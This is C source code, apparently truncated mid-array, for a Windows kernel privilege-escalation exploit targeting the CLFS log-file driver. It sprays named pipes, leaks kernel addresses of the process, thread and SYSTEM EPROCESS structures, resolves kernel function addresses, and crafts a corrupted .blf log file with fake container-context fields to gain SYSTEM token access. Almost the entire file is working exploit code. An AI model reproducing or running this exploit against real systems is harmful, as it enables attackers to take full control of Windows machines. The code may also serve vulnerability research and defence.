
#include "clfs_eop.h"

// Global Variables 
IO_STATUS_BLOCK status_block = { 0 };
UINT64 offset_SeSetAccess = 0;
UINT64 offset_RtlClearBit = 0;
UINT64 offset_PoFxProcessorNotification=0;
UINT64 offset_SeSetAccessStateGenericMapping = 0;
UINT64 offset_FsRtlCurrentBatchOplock = 0;
func3* _NtFsControlFile;
UINT64 fnSeSetAccessStateGenericMapping = 0;
UINT64 fnPoFxProcessorNotification = 0;
UINT64 offset_ClfsEarlier = 0;
UINT64 offset_ClfsMgmtDeregisterManagedClient = 0;
UINT64 fnClfsEarlierLsn = 0;
UINT64 fnClfsMgmtDeregisterManagedClient = 0;
UINT64 fnRtlClearBit = 0;
UINT64 fnFsRtlCurrentBatchOplock = 0;
UINT64 para_PipeAttributeobjInkernel = 0;
CHAR clfs_path[] = { "\\SystemRoot\\System32\\drivers\\CLFS.SYS" };
FARPROC user_ClfsEarlierLsn = NULL;
FARPROC user_ClfsMgmtDeregisterManagedClient = NULL;
FARPROC user_RtlClearBit = NULL;
FARPROC user_SeSetAccessStateGenericMapping = NULL;
FARPROC user_PoFxProcessorNotification = NULL;
UINT64 ntos_kernelBase = NULL;
UINT64 clfs_kernelBase = NULL;
WCHAR* stored_env_xfname = { 0 };
WCHAR* stored_env_containerfname = { 0 };
WCHAR* stored_env_filename = { 0 };
VOID* temp_chunk = 0;
HANDLE logFile = INVALID_HANDLE_VALUE;
HANDLE logFile2 = INVALID_HANDLE_VALUE;
HANDLE filehandle = INVALID_HANDLE_VALUE;
HANDLE hPipeRead = 0 ;
HANDLE hPipeWrite = 0;
UINT64 System_token_value = 0;
UINT64 System_token_value2 = 0;
size_t numread;
#define NUMELEM 0x7a00
#define NUMELEM2 0x400
char buff[0x7a00];
char buff2[0x400];
char buff1[0x400];
char buff3[0x7a00];
char buff4[0x10000];
INT64 consec_number = 0;
INT64 distance = 0;
INT64 prev_pointer = 0;
INT64 temp_pointer = 0;
INT64 temp_distance = 0;
INT64 final_distance = 0;
UINT num_of_CLFS = 0;
PUINT p_num_of_CLFS = &num_of_CLFS; // number of CLFS tags
CHAR tag[] = { "Clfs" };
PUINT64 p_possible_kernelAddrArray = 0; // Offset of last field virtual address
DWORD* temp_alloc_2 = 0;
unsigned int amount_of_CLFS_pools = 0; // stores the amount of bigpool clfs tags
WCHAR* stored_name_CreateLog;
DWORD _pid = 0;
DWORD pid_to_find = 0;
int token_offset = 0;
LONGLONG token_value = 0;
WCHAR* stored_name_fopen;
WCHAR* foldr = nullptr;
DWORDLONG system_EPROCESS = 0;
DWORDLONG system_EPROCESS_low = 0;
DWORDLONG system_EPROCESS_high = 0;
PUINT64 kernelAddrArray = 0;
HANDLE hProcess = NULL;
HANDLE hThread = NULL;
HANDLE hToken = NULL;
HMODULE user32 = NULL;
int flag = 0;
int flag2 = 0;
UINT64 dest2 = 0;
UINT64 dest3 = 0;
UINT64 value2 = 0;
UINT64* value3 = 0;
UINT64 next_token;
HMODULE ntbase = 0;
UINT PIPE_ATTR_TAG = 0x7441704E; // NpAt
ULONG retlen2 = 0;
int random_part = 0;
int random_part2 = 0;
UINT64 CLFS_kernelAddrArray = 0;
HANDLE hlogfile = INVALID_HANDLE_VALUE;
FILE* pfile = 0;
FILE* pfile2 = 0;
WCHAR* stored_env_log = { 0 };
WCHAR* stored_env = { 0 };
WCHAR* stored_env_spray = { 0 };
WCHAR* stored_env_spray_log;
WCHAR* stored_log_arrays[10] = { 0 };
WCHAR* stored_container_arrays[10] = { 0 };
WCHAR* stored_fopen_arrays[10] = { 0 };
WCHAR* tmp_env8 = { 0 };
VOID * buffer_0x1a0 = { 0 };
UINT64 * handles_buffer1 = { 0 };
UINT64* handles_buffer2 = { 0 };
VOID* dest;
unsigned int pos_token = 0;


void fun_pipeSpray(int value, UINT64* temp_buffer) {


	int contador = 0;
	if (value > 0)
	{
		int index = 0;
		do
		{
			if (!(unsigned int)CreatePipe((PHANDLE)&temp_buffer[index], (PHANDLE)&temp_buffer[index + 1], 0, 0x25c0))
			{
				if (contador > 0)
				{
					do
					{
						CloseHandle((HANDLE)*temp_buffer);
						CloseHandle((HANDLE)temp_buffer[1]);
						temp_buffer += 2;
						--contador;
					} while (contador);
				}
				exit(1);

			}

			contador = contador + 1;
			index += 2;
		} while (contador < value);
	}
	printf("\nnumber of pipes created =%x\n", contador);
	return;
}

void getVirtualAddress() {
	ntbase = LoadLibraryA("ntdll.dll");

	if (!ntbase) {
		printf("[!] LoadLibrary failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	fnNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntbase, "NtQuerySystemInformation");

	_NtFsControlFile = (func3*)GetProcAddress(ntbase, "NtFsControlFile");
	if (!_NtFsControlFile) exit(1);


	printf("\nVIRTUAL ADDRESSES AND OFFSETS\n");

	printf("[+] NtFsControlFile Address --> %p\n", _NtFsControlFile);

	if (!CreatePipe(&hPipeRead, &hPipeWrite, 0, 0x1000))
	{
		exit(0);
	}


	temp_chunk = malloc(0x2000);

	if (temp_chunk == 0) { exit(0); }

	memset((UINT64*)temp_chunk + 1, 0x41, 0xffe);
	*(UINT64*)temp_chunk = 0x5a; // "Z"

	dest = malloc(0x100);

	if (dest == 0) { exit(0); }

	memset(dest, 0x42, 0xff);

	temp_alloc_2 = (DWORD*)VirtualAlloc(0, 0x1000, 0x1000, 4);

	_NtFsControlFile(hPipeWrite, 0, 0, 0, &status_block, 0x11003c, temp_chunk, 0xfd8, dest, 0x100);

	fnNtQuerySystemInformation(SystemBigPoolInformation, temp_alloc_2, 0x1000, &retlen2);

	DWORD* v5a = (DWORD*)VirtualAlloc(0, (SIZE_T)retlen2, 0x1000, 4);


	NTSTATUS status = STATUS_SUCCESS;

	if (NT_SUCCESS(status = fnNtQuerySystemInformation(SystemBigPoolInformation, v5a, retlen2, &retlen2))) {
		PSYSTEM_BIGPOOL_INFORMATION pBuf = (PSYSTEM_BIGPOOL_INFORMATION)(v5a);

		if (pBuf == 0) { exit(0); }

		for (ULONG i = 0; i < pBuf->Count; i++) {
			__try {
				if (pBuf->AllocatedInfo[i].TagUlong == PIPE_ATTR_TAG) {
					printf("[+] pool NpAt VirtualAddress -->%p\n", pBuf->AllocatedInfo[i].VirtualAddress);
					para_PipeAttributeobjInkernel = (UINT64)pBuf->AllocatedInfo[i].VirtualAddress;
					break;
				}
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				printf("(%s) Access Violation was raised.", __FUNCTION__);
			}
		}
	}
	
	return;
}

SIZE_T GetObjectKernelAddress(HANDLE Object)
{
	PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
	ULONG	handleInfoSize = 0x1000;
	ULONG	retLength;
	NTSTATUS status;
	SIZE_T kernelAddress = 0;
	BOOL bFind = FALSE;

	while (TRUE)
	{
		handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

		status = fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);

		if (status == 0xC0000004 || NT_SUCCESS(status)) // STATUS_INFO_LENGTH_MISMATCH
		{
			LocalFree(handleInfo);

			handleInfoSize = retLength + 0x100;
			handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

			status = fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);


			if (!handleInfo) {
				printf("[!] cannot read handle info %x\n", (unsigned int)GetLastError());
				exit(1);
			}

			ULONG numHandles = (ULONG)handleInfo->NumberOfHandles;

			if (!numHandles) {
				printf("[!] cannot read number of handles %x\n", (unsigned int)GetLastError());
				exit(1);
			}

			if (NT_SUCCESS(status))
			{
				for (ULONG i = 0; i < numHandles; i++)
				{
					if ((DWORD64)Object == 0x4)
					{
						if (0x4 == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)Object == (SIZE_T)handleInfo->Handles[i].HandleValue)
						{

							kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
							bFind = TRUE;
							break;
						}
					}
					else
					{
						if (GetCurrentProcessId() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)Object == (SIZE_T)handleInfo->Handles[i].HandleValue)
						{
							kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
							bFind = TRUE;
							break;
						}
					}
				}
			}

		}

		if (handleInfo)
			LocalFree(handleInfo);

		if (bFind)
			break;
	}

	return kernelAddress;
}

VOID InitEnvironment()
{

	DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &hProcess, 0, FALSE, DUPLICATE_SAME_ACCESS);

	g_EProcessAddress = GetObjectKernelAddress(hProcess);
	printf("[+] MY EPROCESSS %p\n", (void*)g_EProcessAddress);

	system_EPROCESS = GetObjectKernelAddress((HANDLE)4);
	printf("[+] SYSTEM EPROCESSS %p\n", (void*)system_EPROCESS);

	DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
	g_EThreadAddress = GetObjectKernelAddress(hThread);
	printf("[+] _ETHREAD ADDRESS %p\n", (void*)g_EThreadAddress);

	g_PreviousModeAddress = g_EThreadAddress + OFFSET_OF_PREVIOUS_MODE;
	printf("[+] PREVIOUS MODE ADDRESS %p\n", (void*)g_PreviousModeAddress);

	FindKernelModulesBase();

	//Find CLFS functions

	HMODULE CLFS_userBase = LoadLibraryExW(L"C:\\Windows\\System32\\drivers\\CLFS.SYS", 0, 1);
	if (CLFS_userBase)
	{
		user_ClfsEarlierLsn = GetProcAddress(CLFS_userBase, "ClfsEarlierLsn");
		user_ClfsMgmtDeregisterManagedClient = GetProcAddress(CLFS_userBase, "ClfsMgmtDeregisterManagedClient");

	}


	offset_ClfsEarlier = (UINT64)user_ClfsEarlierLsn - (UINT64)CLFS_userBase;
	offset_ClfsMgmtDeregisterManagedClient = (UINT64)user_ClfsMgmtDeregisterManagedClient - (UINT64)CLFS_userBase;

	printf("[+] Offset ClfsEarlierLsn --------------------------> %p\n", (void*)offset_ClfsEarlier);
	printf("[+] Offset ClfsMgmtDeregisterManagedClient --------------------------> %p\n", (void*)offset_ClfsMgmtDeregisterManagedClient);

	fnClfsEarlierLsn = clfs_kernelBase + offset_ClfsEarlier;
	fnClfsMgmtDeregisterManagedClient = clfs_kernelBase + offset_ClfsMgmtDeregisterManagedClient;

	printf("[+] Kernel ClfsEarlierLsn --------------------------> %p\n", (void*)fnClfsEarlierLsn);
	printf("[+] Kernel ClfsMgmtDeregisterManagedClient --------------------------> %p\n", (void*)fnClfsMgmtDeregisterManagedClient);

	//Find NTOSKRNL functions

	HMODULE ntos_userBase = LoadLibraryExW(L"ntoskrnl.exe", 0, 1);
	if (ntos_userBase)
	{
		user_RtlClearBit = GetProcAddress(ntos_userBase, "RtlClearBit");
		user_PoFxProcessorNotification = GetProcAddress(ntos_userBase, "PoFxProcessorNotification");
		user_SeSetAccessStateGenericMapping = GetProcAddress(ntos_userBase, "SeSetAccessStateGenericMapping");

	}

	offset_RtlClearBit = (UINT64)user_RtlClearBit - (UINT64)ntos_userBase;
	offset_PoFxProcessorNotification = (UINT64)user_PoFxProcessorNotification - (UINT64)ntos_userBase;
	offset_SeSetAccessStateGenericMapping = (UINT64)user_SeSetAccessStateGenericMapping - (UINT64)ntos_userBase;

	printf("[+] Offset RtlClearBit --------------------------> %p\n", (void*)offset_RtlClearBit);
	printf("[+] Offset PoFxProcessorNotification --------------------------> %p\n", (void*)offset_PoFxProcessorNotification);
	printf("[+] Offset SeSetAccessStateGenericMapping --------------------------> %p\n", (void*)offset_SeSetAccessStateGenericMapping);



	fnRtlClearBit = ntos_kernelBase + offset_RtlClearBit;
	fnSeSetAccessStateGenericMapping = ntos_kernelBase + offset_SeSetAccessStateGenericMapping;
	fnPoFxProcessorNotification = ntos_kernelBase + offset_PoFxProcessorNotification;

	printf("[+] Kernel RtlClearBit --------------------------> %p\n", (void*)fnRtlClearBit);
	printf("[+] Kernel SeSetAccessStateGenericMapping --------------------------> %p\n\n", (void*)fnSeSetAccessStateGenericMapping);
	printf("[+] Kernel PoFxProcessorNotification --------------------------> %p\n\n", (void*)fnPoFxProcessorNotification);

	return;
}

int createInitialLogFile() {

	printf("\nPATHS\n");

	WCHAR* foldr = nullptr;
	size_t sz = 0;
	if (not(_wdupenv_s(&foldr, &sz, L"PUBLIC") == 0 && foldr != nullptr))
	{
		return 0;

	}



	WCHAR* tmp_env = (WCHAR*)malloc(0x1000);

	if (!tmp_env) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	stored_env = tmp_env; // where Public environment variable is stored
	memset(tmp_env, 0, 0x1000);

	wsprintfW(stored_env, L"%s", foldr);

	wprintf((LPWSTR)L"[+] Folder Public Path = %ls\n", stored_env); //stored_env is C:\Users\Public

	WCHAR* tmp_env2 = (WCHAR*)malloc(0x1000);

	if (!tmp_env2) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	stored_env_log = tmp_env2; // where Public environment variable is stored
	memset(tmp_env2, 0, 0x1000);

	wsprintfW(stored_env_log, L"LOG:%s", stored_env);


	srand((unsigned int)time(NULL));
	random_part = rand() % 100 + 1;

	WCHAR* tmp_env3 = (WCHAR*)malloc(0x1000);

	if (!tmp_env3) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	stored_name_CreateLog = tmp_env3; // where Public environment variable is stored
	memset(tmp_env3, 0, 0x1000);

	wsprintfW(stored_name_CreateLog, L"%s\\%d", stored_env_log, random_part);//en el blogpost es para_pszLogFileName

	wprintf((LPWSTR)L"[+] Base log file name path= %ls\n", stored_name_CreateLog); //stored_env_fname is example=LOG:C:\Users\Public\1280


	WCHAR* tmp_env4 = (WCHAR*)malloc(0x1000);

	if (!tmp_env4) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	stored_name_fopen = tmp_env4; // where Public environment variable is stored
	memset(tmp_env4, 0, 0x1000);


	wsprintfW(stored_name_fopen, L"%s\\%d.blf", stored_env, random_part); ////en el blogpost es para_myLogfileName 

	wprintf((LPWSTR)L"[+] Base file path = %ls\n", stored_name_fopen); //stored_env_open example=C:\Users\Public\1623.blf


	WCHAR* tmp_env6 = (WCHAR*)malloc(0x1000);

	if (!tmp_env6) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}

	stored_env_containerfname = tmp_env6; 
	memset(tmp_env6, 0, 0x1000);


	srand((unsigned int)time(NULL));
	int rand0 = rand();

	wsprintfW(stored_env_containerfname, L"%s\\.p_%d", stored_env, random_part);

	wprintf((LPWSTR)L"[+] Container file name path = %ls\n", stored_env_containerfname); //stored_env_containerfname example=C:\Users\Public\.2796

	WCHAR* tmp_env7 = (WCHAR*)malloc(0x1000);


	

	// 1. Create a base log file MyLog.blf in the folder C:\Users\Public\ via the CreateLogFile API

	logFile = CreateLogFile(stored_name_CreateLog, GENERIC_READ | GENERIC_WRITE, 1, 0, 4, 0);



	if (logFile == INVALID_HANDLE_VALUE) {
		DWORD error = GetLastError();
		printf("Could not create LOGfile1, error: 0x%x\n", (unsigned int)error);
		exit(-1);
	}


	CloseHandle(logFile);



	return 0;
}

UINT64 getBigPoolInfo()
{
	UINT64 contador = 0;
	UINT v8 = 0; // counter
	UINT64 possible_kernelAddres = 0;
	ULONG retlen = 0;
	PUINT64 temp_kernelAddrArray = 0;
	ULONG real_size = 0;
	DWORD* buf_big_pool_info;
	UINT field_count = 0;
	UINT64 pool_CLFS = 0;
	PUINT64 p_pool_CLFS = &pool_CLFS;

	DWORD* temp_big_pool_info = (DWORD*)VirtualAlloc(0, 0x1000, 0x1000, 4);

	if (!temp_big_pool_info) {
		printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
		exit(1);
	}
	if (fnNtQuerySystemInformation(SystemBigPoolInformation, temp_big_pool_info, 0x1000, &retlen) == 0xC0000004)
	{

		while (1)
		{
			VirtualFree(temp_big_pool_info, 0, 0x8000);
			real_size = retlen;
			buf_big_pool_info = (DWORD*)VirtualAlloc(0, (SIZE_T)real_size, 0x1000, 4);
			temp_big_pool_info = buf_big_pool_info;
			if (!buf_big_pool_info)
			{
				printf("[+] Error Allocating Memory\n");
				break;
			}

			if (fnNtQuerySystemInformation(SystemBigPoolInformation, buf_big_pool_info, real_size, &retlen) != 0xC0000004)
			{
				goto label_4;
			}
			else {
				break;
			}

		}

	}
	else {
	label_4:

		field_count = (UINT) * (PUINT)temp_big_pool_info; // v6 is the field count on the SYSTEM_BIGPOOL_INFORMATION


		if (flag2 == 0) {
			kernelAddrArray = (PUINT64)malloc((UINT64)field_count * 8);
			if (!kernelAddrArray) {
				printf("[!] Allocation failed with error %x\n", (unsigned int)GetLastError());
				exit(1);
			}
			//			printf("Kernel addresss array %p", kernelAddrArray);
			memset(kernelAddrArray, 0, ((UINT64)field_count * 8));
			flag2++;
		}
		//printf("field count of pools =%d\n", field_count);
		if (field_count)
		{
			amount_of_CLFS_pools = *p_num_of_CLFS;
			//printf("amount_of_CLFS_pools %d\n", amount_of_CLFS_pools);
			p_possible_kernelAddrArray = (PUINT64)&temp_big_pool_info[4 * field_count - 4 + 2 * field_count];


			do {
				possible_kernelAddres = *p_possible_kernelAddrArray & 0xFFFFFFFFFFFFFFFE;

				if ((*p_possible_kernelAddrArray & 1) == 0)
				{
					possible_kernelAddres = *p_possible_kernelAddrArray;
				}
				if (p_possible_kernelAddrArray[1] == 0x7a00)  // search for the clfs base log file size
				{
					
					UINT v12 = 0;
					while (1)
					{
						CHAR v13 = tag[v12++];
						if (v13 != *((BYTE*)p_possible_kernelAddrArray + v12 + 15))
						{
							break;
						}

						if (v12 == 5) // tag Clfs found !
						{
							UINT v14 = 0;
							

							if (amount_of_CLFS_pools <= 0)
							{
							label_16:
								UINT v16 = amount_of_CLFS_pools++;
								kernelAddrArray[v16] = possible_kernelAddres;


								if (p_pool_CLFS)
								{
									++v8;
									*p_pool_CLFS = possible_kernelAddres;
									//printf("Possible kernel CLFS address= %p\n", possible_kernelAddres);

								}
							}
							else
							{
								temp_kernelAddrArray = kernelAddrArray;
								while (*temp_kernelAddrArray != possible_kernelAddres)
								{
									++v14;
									++temp_kernelAddrArray;
									if (v14 >= amount_of_CLFS_pools) {
										goto label_16;
									}
								}
							}
							break;
						}

					}
				}


				++contador;
				p_possible_kernelAddrArray -= 3; // back 0x18 to previous System Big Pool Entry to find the 0x7a00
			} while (contador < field_count); // it compares the counter against the field count of SYSTEM_BIGPOOL_INFORMATION

			*p_num_of_CLFS = amount_of_CLFS_pools;
		}

		if (p_pool_CLFS && v8 == 0) {
			printf("[+] Not found available chunk\n");
			exit(1);
		}
		VirtualFree(temp_big_pool_info, 0, 0x8000);
	}
	printf("Last kernel CLFS address = % p\n", pool_CLFS);
	printf("numero de tags CLFS founded %d\n\n", v8);
	return pool_CLFS;
}

VOID craftbaseFile(FILE* pfile) {


	unsigned char RecordOffset12[] = { 0x69, 0x03 }; // offset 0x858 RecordOffset[12d] to 0x369

	unsigned char data1[] = { 0xa0, 0x15}; // offset 0x1dd0 to 0x15a0

	unsigned char data2[] = { 0x70, 0x15}; // offset 0x1dd4 to 0x1570

	unsigned char data3[] = { 0x08, 0xf0, 0xfd, 0xc1 }; // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

	unsigned char data4[] = { 0x30, 0x00 }; // offset 0x1de4  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cbNode is the size of the container (to 0x30)

	unsigned char data5[] = { 0x00, 0x00, 0x00, 0x05 }; // offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer


	unsigned char data6[] = { 0x58, 0x18}; // offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContaine

	unsigned char data7[] = { 0x88, 0x18}; // offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContaine


	fseek(pfile, 0x858, SEEK_SET);
	fwrite(RecordOffset12, sizeof(char), sizeof(RecordOffset12), pfile); // offset 0x858 RecordOffset[12d] to 0x369

	fseek(pfile, 0x1dd0, SEEK_SET);
	fwrite(data1, sizeof(char), sizeof(data1), pfile);// offset 0x1dd0

	fseek(pfile, 0x1dd4, SEEK_SET);
	fwrite(data2, sizeof(char), sizeof(data2), pfile);// offset 0x1dd4

	fseek(pfile, 0x1de0, SEEK_SET);
	fwrite(data3, sizeof(char), sizeof(data3), pfile); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
	
	fseek(pfile, 0x20b8, SEEK_SET);
	fwrite(data7, sizeof(char), sizeof(data7), pfile); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

	fseek(pfile, 0x20bc, SEEK_SET);
	fwrite(data6, sizeof(char), sizeof(data6), pfile); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
	
	fseek(pfile, 0x20c8, SEEK_SET);
	fwrite(data3, sizeof(char), sizeof(data3), pfile); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

	fseek(pfile, 0x20cc, SEEK_SET);
	fwrite(data4, sizeof(char), sizeof(data4), pfile); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

	fseek(pfile, 0x20e0, SEEK_SET);
	fwrite(data5, sizeof(char), sizeof(data5), pfile); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

	fseek(pfile, 0x1de4, SEEK_SET);
	fwrite(data4, sizeof(char), sizeof(data4), pfile); // offset 0x1de4  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cbNode is the size of the container (to 0x30)

	fseek(pfile, 0x1df8, SEEK_SET);
	fwrite(data5, sizeof(char), sizeof(data5), pfile); // offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer



	fseek(pfile, 0x8258, SEEK_SET);
	fwrite(RecordOffset12, sizeof(char), sizeof(RecordOffset12), pfile); // offset 0x8258 RecordOffset[12d] to 0x369// offset 0x858 RecordOffset[12d] to 0x369

	fseek(pfile, 0x97d0, SEEK_SET);
	fwrite(data1, sizeof(char), sizeof(data1), pfile);// offset 0x97d0 to 0x15a0

	fseek(pfile, 0x97d4, SEEK_SET);
	fwrite(data2, sizeof(char), sizeof(data2), pfile);// offset 0x97d4 to 0x1570

	fseek(pfile, 0x97e0, SEEK_SET);
	fwrite(data3, sizeof(char), sizeof(data3), pfile); // offset 0x97e0 shadow block write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

	fseek(pfile, 0x97e4, SEEK_SET);
	fwrite(data4, sizeof(char), sizeof(data4), pfile); // offset 0x97e4  shadow block to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cbNode is the size of the container (to 0x30)

	fseek(pfile, 0x97f8, SEEK_SET);
	fwrite(data5, sizeof(char), sizeof(data5), pfile); // offset 0x1df8  shadow block to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer


	return;
}

VOID craftSprayFile(FILE* pfile) {

	unsigned char ValidSectorCount[] = { 0x01, 0x00}; // offset 0x6 ValidSectorCount

	unsigned char ullDumpCount[] = { 0x02, 0x00 }; // offset 0x70 ullDumpCount

	unsigned char eExtendState[] = { 0x02, 0x00 }; // offset 0x84 eExtendState

	unsigned char iExtendBlock[] = { 0x04, 0x00 }; // offset 0x88 iExtendBlock

	unsigned char iFlushBlock[] = { 0x04, 0x00 }; // offset 0x8a iFlushBlock

	unsigned char cExtendStartSectors[] = { 0x01, 0x00 }; // offset 0x90 cExtendStartSectors

	unsigned char cExtendSectors[] = { 0x03, 0x00 }; // offset 0x94 cExtendSectors

	unsigned char cClients[] = { 0x02, 0x00 }; // offset 0x9c cClients

	unsigned char cbsymbolZone[] = { 0xc8, 0x65 }; // offset 0x1b98 cbsymbolZone for windows 11 and 10


	unsigned char rawData[512] = {
		0x15, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
		0xFF, 0xFF, 0xFF, 0xFF, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x03, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x1C, 0x5F, 0x00, 0x00, 0xF5, 0xC1, 0xF5, 0xC1, 0x01, 0x00, 0x00, 0x00,
		0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
		0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00,
		0x00, 0x08, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00,
		0x00, 0x82, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
		0x00, 0xFC, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
		0x00, 0xFE, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
